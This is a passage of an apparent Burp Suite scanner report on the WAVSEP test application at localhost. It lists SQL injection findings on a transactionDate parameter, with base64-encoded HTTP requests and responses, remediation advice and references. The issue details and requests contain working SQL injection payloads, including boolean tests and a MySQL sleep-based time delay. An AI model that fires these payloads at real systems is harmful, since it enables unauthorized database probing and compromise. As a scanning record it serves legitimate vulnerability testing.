      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MDANCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyMGFuZCUyMCcyMTc3JyUzZCcyMTg2]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MDYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYic=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQzOjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MDYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6253610679695952896</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>' and '6704'='6704</b> and <b>' and '2445'='2450</b> were each submitted in the transactionDate parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyMGFuZCUyMCc2NzA0JyUzZCc2NzA0]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClNldmVyYWwgYWNjb3VudHMgbWF0Y2ggdGhlIGNyaXRlcmlhLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyMGFuZCUyMCcyNDQ1JyUzZCcyNDUw]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNDANCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCk5vIE1hdGNoLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTMtSW5qZWN0aW9uSW5DYWxjLURhdGUtQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYic=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQzOjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNDANCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCk5vIE1hdGNoLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4025962859112384512</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
